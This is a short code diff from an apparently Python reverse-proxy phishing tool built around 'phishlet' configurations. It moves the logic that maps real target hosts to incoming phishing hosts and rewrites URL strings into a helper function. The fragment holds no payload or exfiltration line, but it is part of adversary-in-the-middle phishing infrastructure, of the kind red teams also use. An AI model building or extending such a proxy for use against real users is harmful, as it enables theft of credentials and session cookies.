@@ -2853,23 +2853,10 @@ async def proxy_handler(request):
                         local_map[target_host] = incoming_host
                         debug_log(f"  Main target mapping (added last): {target_host} -> {incoming_host}", "DEBUG")
                         
-                        # Add mapping for string replacement from filters
-                        for filter in current_phishlet_data.get('filters', []):
-                            if filter.get('type') == 'url':
-                                if filter.get('url') == '*':
-                                    local_map[filter.get('locate')] = filter.get('replace')
-                                    debug_log(f"  String replacement mapping (global): {filter.get('locate')} -> {filter.get('replace')}", "DEBUG")
-                                else:
-                                    # Compare URL path instead of full URL object
-                                    request_path = str(request.url.path)
-                                    filter_url = filter.get('url', '')
-                                    if filter_url == request_path or filter_url in request_path:
-                                        local_map[filter.get('locate')] = filter.get('replace')
-                                        debug_log(f"  String replacement mapping (URL-specific): {filter.get('locate')} -> {filter.get('replace')} for path {request_path}", "DEBUG")
-                                    else:
-                                        debug_log(f"  Skipping string replacement for path {request_path} (filter URL: {filter_url})", "DEBUG")
-                            else:
-                                debug_log(f"  Skipping non-URL filter: {filter.get('type')}", "DEBUG")
+                        # Add mapping for string replacement from filters using helper function
+                        request_path = str(request.url.path)
+                        filter_replacements = process_phishlet_filters(current_phishlet_data, request_path, debug_log)
+                        local_map.update(filter_replacements)
                         
                         # Use only the current phishlet's mappings
                         filtered_map = local_map
